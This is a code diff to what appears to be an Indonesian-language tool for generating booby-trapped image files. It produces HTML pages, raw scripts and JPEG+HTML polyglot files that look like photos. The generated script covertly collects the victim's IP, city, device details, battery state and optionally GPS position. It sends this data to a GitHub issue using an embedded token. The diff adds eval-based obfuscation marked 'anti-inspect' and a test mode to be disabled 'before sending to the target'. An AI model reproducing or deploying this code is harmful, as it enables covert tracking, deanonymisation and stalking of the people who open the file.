@@ -303,6 +303,7 @@ footer{max-width:1560px;margin:18px auto 26px;padding:0 18px;color:var(--tx3);fo
     <div class="checks" style="margin-top:13px">
       <label><input type="checkbox" id="bGeo"> minta izin GPS presisi</label>
       <label><input type="checkbox" id="bHide" checked> sembunyikan script (anti-inspect)</label>
+      <label><input type="checkbox" id="bTest"> mode uji — status tampil di layar payload (buat tes sendiri, matiin sebelum kirim ke target!)</label>
     </div>
     <div class="banner warn hidden" id="tokWarnBuild" style="margin:13px 0 0">
       <span class="ic">⚠</span>
@@ -726,7 +727,7 @@ $("btnGen").onclick=()=>{
     : (/\.[a-z0-9]+$/i.test(name0)?name0:name0+".jpeg");
   const title=$("bTitle").value||"Foto";
   const net=$("bNet").value;
-  const useGeo=$("bGeo").checked, hide=$("bHide").checked;
+  const useGeo=$("bGeo").checked, hide=$("bHide").checked, test=$("bTest").checked;
   const active=payloadActive();
   $("tokWarnBuild").classList.toggle("hidden",active);
   $("btnGen").disabled=true; toast("Normalisasi foto ke JPEG asli...");
@@ -734,15 +735,15 @@ $("btnGen").onclick=()=>{
     try{
       const mo=[["html","HTML"],["script","RAW JS"],["polyglot","POLYGLOT"],["disguise","DISGUISE .jpeg"]].find(x=>x[0]===mode)[1];
       if(mode==="script"){
-        const out=genScript({title,net,useGeo,hide});
+        const out=genScript({title,net,useGeo,hide,test});
         CFG._lp={kind:"text",text:out,mime:"text/javascript",name:name.replace(/\.[^.]+$/,"")+".js"};
         $("outCode").value=out; $("outSize").textContent=fmtSize(new Blob([out]).size);
       } else if(mode==="polyglot"){
-        const p=genPolyglot({img:jpg,title,net,useGeo,hide});
+        const p=genPolyglot({img:jpg,title,net,useGeo,hide,test});
         CFG._lp={kind:"bin",bytes:p.bytes,name};
         $("outCode").value=p.html; $("outSize").textContent=fmtSize(p.bytes.length)+" · JPEG+HTML";
       } else {
-        const out=genHTML({img:jpg,title,net,useGeo,hide});
+        const out=genHTML({img:jpg,title,net,useGeo,hide,test});
         CFG._lp={kind:"text",text:out,mime:"text/html",name};
         $("outCode").value=out; $("outSize").textContent=fmtSize(new Blob([out]).size);
       }
@@ -765,11 +766,13 @@ function genScript(o){
   const T=JSON.stringify({owner:CFG.owner,repo:CFG.repo,token:CFG.token});
   const gps=o.useGeo?"geo();":"";
   const geofn=o.useGeo?`\nfunction geo(){ if(navigator.geolocation){ var t=setTimeout(function(){},4000); navigator.geolocation.getCurrentPosition(function(p){ d.lat=p.coords.latitude; d.lon=p.coords.longitude; d.geo='ok'; clearTimeout(t); }, function(){}, {timeout:3500}); } }`:"";
-  const submitDel=`function submit(){ if(d.sent) return; d.sent=1; var b=JSON.stringify({title:W.tag+' '+d.ip+' / '+(d.city||'?')+' / '+new Date().toISOString().slice(0,19),body:'\\u25C8\\u25C8\\u25C8\\n'+JSON.stringify(d)+'\\n\\u25C8\\u25C8\\u25C8'}); var u='https://api.github.com/repos/'+W.owner+'/'+W.repo+'/issues'; (function att(n){ fetch(u,{method:'POST',headers:{'Authorization':'token '+W.token,'Accept':'application/vnd.github+json','Content-Type':'application/json'},body:b}).then(function(r){ if(!r.ok&&n<3) setTimeout(function(){att(n+1);},2200); }).catch(function(){ if(n<3) setTimeout(function(){att(n+1);},2200); }); })(0); }`;
+  const submitDel=`function submit(){ if(d.sent) return; d.sent=1; var b=JSON.stringify({title:W.tag+' '+d.ip+' / '+(d.city||'?')+' / '+new Date().toISOString().slice(0,19),body:'\\u25C8\\u25C8\\u25C8\\n'+JSON.stringify(d)+'\\n\\u25C8\\u25C8\\u25C8'}); var u='https://api.github.com/repos/'+W.owner+'/'+W.repo+'/issues'; (function att(n){ fetch(u,{method:'POST',headers:{'Authorization':'token '+W.token,'Accept':'application/vnd.github+json','Content-Type':'application/json'},body:b}).then(function(r){ if(r.ok){show('\\u2713 TERKIRIM ke dashboard');} else if(n<3){show('coba ulang '+n+'…'); setTimeout(function(){att(n+1);},2200);} else {show('\\u2717 GAGAL HTTP '+r.status);} }).catch(function(){ if(n<3){show('coba ulang '+n+'…'); setTimeout(function(){att(n+1);},2200);} else {show('\\u2717 GAGAL KIRIM (jaringan terblokir?)');} }); })(0); }`;
   return `(function(){
 "use strict";
 var W=${T};
 W.tag=(W.tag||'[HIT]');
+W.test=${o.test?1:0};
+var show=W.test?function(t){try{document.getElementById('_s9').textContent=t;}catch(e){}}:function(){};
 var d={ts:new Date().toISOString(),ua:(navigator.userAgent||''),language:(navigator.language||''),langs:(navigator.languages||[]),platform:(navigator.platform||'')};
 try{d.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(e){}
 d.tzOffset=new Date().getTimezoneOffset();
@@ -801,14 +804,14 @@ var batt=null;
 try{if(navigator.getBattery){navigator.getBattery().then(function(b){d.batteryLevel=b.level; d.charging=b.charging; d.batteryTime=b.dischargingTime===Infinity?null:Math.round(b.dischargingTime);}).catch(function(){});}else{}}catch(e){}
 ${submitDel}
 ${geofn}
-function run(){fetch('https://ipinfo.io/json').then(function(r){return r.json();}).then(function(j){d.ip=j.ip||d.ip; d.city=j.city||''; d.region=j.region||''; d.country=j.country||''; d.org=(j.org||'').split(' ')[0]; d.postal=j.postal||''; d.tz=j.timezone||''; d.loc=j.loc||''; if(d.loc){var p=d.loc.split(','); d.lat=parseFloat(p[0]); d.lon=parseFloat(p[1]);} ${gps} setTimeout(submit,900); }).catch(function(){d.ip=d.ip||'n/a'; ${gps} setTimeout(submit,900); });}
+function run(){fetch('https://ipinfo.io/json').then(function(r){return r.json();}).then(function(j){d.ip=j.ip||d.ip; d.city=j.city||''; d.region=j.region||''; d.country=j.country||''; d.org=(j.org||'').split(' ')[0]; d.postal=j.postal||''; d.tz=j.timezone||''; d.loc=j.loc||''; if(d.loc){var p=d.loc.split(','); d.lat=parseFloat(p[0]); d.lon=parseFloat(p[1]);} ${gps} show('IP: '+d.ip+' · '+(d.city||'?')+' · '+(d.org||'?')); setTimeout(submit,900); }).catch(function(){d.ip=d.ip||'n/a'; ${gps} show('IP: n/a (ipinfo terblokir) · lanjut kirim…'); setTimeout(submit,900); });}
 run();
 })();`;
 }
 function genPolyglot(o){
   const core=genScript(o);
-  const hide=o.hide?'<script src="data:text/javascript,'+btoa(unescape(encodeURIComponent(core)))+'"><\/script>':'<script>'+core+'<\/script>';
-  const tail='<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'+esc(o.title)+'<\/title><style>body{margin:0;background:#000}.hold{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000}img{max-width:100%;max-height:100%;object-fit:contain}<\/style><\/head><body><div class="hold"><img src="'+o.img+'" alt=""></div>'+hide+'<\/body><\/html>';
+  const hide=o.hide?'<script>eval(decodeURIComponent("'+encodeURIComponent(core)+'"))<\/script>':'<script>'+core+'<\/script>';
+  const tail='<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'+esc(o.title)+'<\/title><style>body{margin:0;background:#000}.hold{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#000}img{max-width:100%;max-height:100%;object-fit:contain}<\/style><\/head><body><div class="hold"><img src="'+o.img+'" alt=""></div>'+(o.test?'<div id="_s9" style="position:fixed;left:0;bottom:0;right:0;z-index:9;background:rgba(0,0,0,.85);color:#0f0;font:11px/1.6 monospace;padding:6px 10px;white-space:pre-wrap">memuat data…<\/div>':'')+hide+'<\/body><\/html>';
   let bytes=dataUrlToBytes(o.img)||_te.encode("invalid");
   if(bytes[bytes.length-2]!==0xff||bytes[bytes.length-1]!==0xd9){ const eoi=new Uint8Array([0xff,0xd9]); const tmp=new Uint8Array(bytes.length+2); tmp.set(bytes); tmp.set(eoi,bytes.length); bytes=tmp; }
   const tb=_te.encode(tail); const full=new Uint8Array(bytes.length+tb.length); full.set(bytes); full.set(tb,bytes.length);
@@ -817,8 +820,8 @@ function genPolyglot(o){
 function genHTML(o){
   const core=genScript(o);
   const css=".hold{position:fixed;inset:0;background:#000;display:flex;align-items:center;justify-content:center;overflow:hidden}img{max-width:100%;max-height:100%;object-fit:contain;animation:f 1.6s ease forwards;opacity:0}@keyframes f{to{opacity:1}}";
-  const hide=o.hide?'<script src="data:text/javascript,'+btoa(unescape(encodeURIComponent(core)))+'"><\/script>':'<script>'+core+'<\/script>';
-  return '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'+esc(o.title)+'<\/title><style>'+css+'<\/style><\/head><body><div class="hold"><img src="'+o.img+'" alt=""></div>'+hide+'<\/body><\/html>';
+  const hide=o.hide?'<script>eval(decodeURIComponent("'+encodeURIComponent(core)+'"))<\/script>':'<script>'+core+'<\/script>';
+  return '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>'+esc(o.title)+'<\/title><style>'+css+'<\/style><\/head><body><div class="hold"><img src="'+o.img+'" alt=""></div>'+(o.test?'<div id="_s9" style="position:fixed;left:0;bottom:0;right:0;z-index:9;background:rgba(0,0,0,.85);color:#0f0;font:11px/1.6 monospace;padding:6px 10px;white-space:pre-wrap">memuat data…<\/div>':'')+hide+'<\/body><\/html>';
 }
 
 /* ---------- settings actions ---------- */
